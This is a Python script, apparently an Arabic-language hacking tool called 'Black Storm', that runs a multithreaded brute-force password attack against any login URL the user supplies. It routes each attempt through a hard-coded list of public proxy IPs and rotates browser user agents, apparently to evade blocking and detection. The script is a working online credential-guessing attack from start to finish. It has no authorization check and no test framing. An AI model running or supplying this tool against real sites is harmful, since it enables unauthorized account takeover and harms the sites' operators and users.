#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
import random
import os
import sys
import json
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

class BlackStormBruteForce:
    def __init__(self):
        self.session = requests.Session()
        self.successful_attempts = []
        self.proxies_list = self.load_embedded_proxies()
        self.current_proxy = None
        self.max_threads = 3
        self.timeout = 30
        self.colors = {
            'red': '\033[91m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'blue': '\033[94m',
            'magenta': '\033[95m',
            'cyan': '\033[96m',
            'white': '\033[97m',
            'reset': '\033[0m',
            'bold': '\033[1m'
        }
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ]

    def clear_screen(self):
        """مسح الشاشة"""
        os.system('clear' if os.name == 'posix' else 'cls')

    def print_banner(self):
        """عرض شعار Black Storm"""
        self.clear_screen()
        banner = f"""
{self.colors['bold']}{self.colors['red']}
╔╦╗╦  ⦔╦╗╦ ╦╔═╗╔╦╗╔═╗╦═╗╔═╗╔═╗╦═╗╔╦╗
 ║ ║   ║ ╠═╣║╣  ║ ║ ║╠╦╝╠═╣║  ╠╦╝ ║
 ╩ ╩═╝ ╩ ╩ ╩╚═╝ ╩ ╚═╝╩╚═╩ ╩╚═╝╩╚═ ╩
{self.colors['reset']}
{self.colors['yellow']}Black Storm - أداة اختبار كلمات المرور المتقدمة{self.colors['reset']}
{self.colors['cyan']}نسخة متكاملة مع جميع التعديلات{self.colors['reset']}
"""
        print(banner)

    def load_embedded_proxies(self):
        """قائمة بروكسي مدمجة محدثة"""
        return [
            "45.95.147.106:8080",  # ألمانيا
            "103.169.255.171:8080",  # إندونيسيا
            "45.70.236.123:999",  # بيرو
            "45.70.15.4:8080",  # البرازيل
            "103.175.237.9:3125",  # ماليزيا
            "45.70.236.194:999",  # بيرو
            "45.71.184.170:999",  # كولومبيا
            "45.224.119.16:999",  # البرازيل
            "45.224.151.19:999",  # البرازيل
            "45.225.184.177:999",  # البرازيل
            "45.226.158.10:999",  # البرازيل
            "45.228.235.25:999",  # البرازيل
            "45.229.205.55:999",  # البرازيل
            "45.229.206.15:999",  # البرازيل
            "45.230.172.11:999",  # البرازيل
            "45.231.148.33:10101",  # البرازيل
            "185.199.229.156:7492",  # أمريكا
            "185.199.228.220:7300",  # أمريكا
            "185.199.231.45:8382",  # أمريكا
            "188.74.210.207:6286",  # هولندا
            "188.74.183.10:8279",  # هولندا
            "188.74.210.21:6100",  # هولندا
            "45.155.68.129:8133",  # ألمانيا
            "154.95.36.199:6893",  # المغرب
            "45.94.47.66:8110",  # ألمانيا
            "144.217.7.157:9300",  # كندا
            "51.158.68.133:8811",  # فرنسا
            "51.158.68.26:8811",  # فرنسا
            "51.158.68.148:8811",  # فرنسا
            "51.158.68.68:8811"   # فرنسا
        ]

    def get_random_user_agent(self):
        """الحصول على user-agent عشوائي"""
        return random.choice(self.user_agents)

    def rotate_proxy(self):
        """تناوب البروكسي من القائمة المدمجة"""
        if not self.proxies_list:
            return None

        self.current_proxy = random.choice(self.proxies_list)
        return {
            'http': f'http://{self.current_proxy}',
            'https': f'http://{self.current_proxy}'
        }

    def check_proxy_quality(self):
        """فحص جودة البروكسي المدمج"""
        working_proxies = []
        print(f"\n{self.colors['yellow']}[*] جاري فحص جودة البروكسي المدمج...{self.colors['reset']}")

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self.test_single_proxy, proxy): proxy for proxy in self.proxies_list}

            for future in as_completed(futures):
                proxy = futures[future]
                if future.result():
                    working_proxies.append(proxy)
                    print(f"\r{self.colors['green']}[+] بروكسي صالح: {proxy.ljust(25)}{self.colors['reset']}", end='')
                else:
                    print(f"\r{self.colors['red']}[-] بروكسي غير صالح: {proxy.ljust(25)}{self.colors['reset']}", end='')

        self.proxies_list = working_proxies
        print(f"\n{self.colors['green']}[*] تم العثور على {len(self.proxies_list)} بروكسي صالح{self.colors['reset']}")
        input(f"\n{self.colors['yellow']}[*] اضغط Enter للمتابعة...{self.colors['reset']}")

    def test_single_proxy(self, proxy):
        """اختبار بروكسي واحد"""
        try:
            proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxies,
                timeout=10
            )
            return response.status_code == 200
        except:
            return False

    def brute_force_attack(self, target_url, username, wordlist_path):
        """هجوم القوة الغاشمة على الهدف"""
        if not os.path.exists(wordlist_path):
            print(f"{self.colors['red']}[!] ملف كلمات المرور غير موجود!{self.colors['reset']}")
            return

        with open(wordlist_path, 'r', encoding='utf-8') as file:
            passwords = [line.strip() for line in file.readlines()]

        self.print_banner()
        print(f"{self.colors['cyan']}[*] بدء الهجوم على: {target_url}{self.colors['reset']}")
        print(f"{self.colors['yellow']}[*] عدد كلمات المرور: {len(passwords)}{self.colors['reset']}")

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for password in passwords:
                futures.append(executor.submit(
                    self.try_login,
                    target_url,
                    username,
                    password
                ))

            for future in as_completed(futures):
                result = future.result()
                if result:
                    print(f"\n{self.colors['green']}[+] نجاح! تم العثور على كلمة المرور: {result}{self.colors['reset']}")
                    self.successful_attempts.append(result)
                    executor.shutdown(wait=False)
                    sys.exit(0)

        if not self.successful_attempts:
            print(f"\n{self.colors['red']}[-] فشل الهجوم! لم يتم العثور على كلمة مرور صالحة.{self.colors['reset']}")

    def try_login(self, target_url, username, password):
        """محاولة تسجيل الدخول باستخدام كلمة مرور محددة"""
        try:
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': target_url,
                'Connection': 'keep-alive',
                'Referer': target_url,
                'Upgrade-Insecure-Requests': '1'
            }

            proxies = self.rotate_proxy()
            data = {
                'username': username,
                'password': password
            }

            response = self.session.post(
                target_url,
                headers=headers,
                data=data,
                proxies=proxies,
                timeout=self.timeout
            )

            if response.status_code == 200:
                if "login failed" not in response.text.lower():
                    return password
            return None
        except:
            return None

if __name__ == "__main__":
    tool = BlackStormBruteForce()
    tool.print_banner()

    target_url = input(f"{tool.colors['cyan']}[*] أدخل رابط الهدف: {tool.colors['reset']}")
    username = input(f"{tool.colors['cyan']}[*] أدخل اسم المستخدم: {tool.colors['reset']}")
    wordlist_path = input(f"{tool.colors['cyan']}[*] أدخل مسار ملف كلمات المرور: {tool.colors['reset']}")

    tool.check_proxy_quality()
    tool.brute_force_attack(target_url, username, wordlist_path)